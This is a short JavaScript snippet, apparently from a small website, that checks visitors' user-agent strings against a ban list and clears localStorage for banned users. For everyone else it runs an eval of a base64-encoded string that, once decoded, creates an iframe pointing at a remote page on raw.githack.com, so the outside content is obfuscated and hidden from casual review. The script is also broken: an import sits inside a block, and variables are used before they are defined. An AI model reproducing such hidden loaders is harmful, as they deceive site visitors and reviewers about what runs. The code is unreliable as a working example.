if(id){location.reload()};
if(bans){location.reload()}else{
	import{bans,reasons,projects} from "./list.js";
	const id = navigator.userAgent;
	if(bans.includes(id)){
		for(i in bans){
			if(id===bans[i]){document.write("You Have Been Banned<br>"+reasons[i]+"");localStorage.clear()}
		}
	}else{
		 eval(atob('aWZyYW1lID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaWZyYW1lIik7CmlmcmFtZS5zcmMgPSAiaHR0cHM6Ly9yYXcuZ2l0aGFjay5jb20vVGhlRGFya1dhcnJpb3IxMTUvUHJvamVjdE9tZWdhMjIxL21haW4vcmVmZXJyZXIuaHRtbCI7'));
	}
};
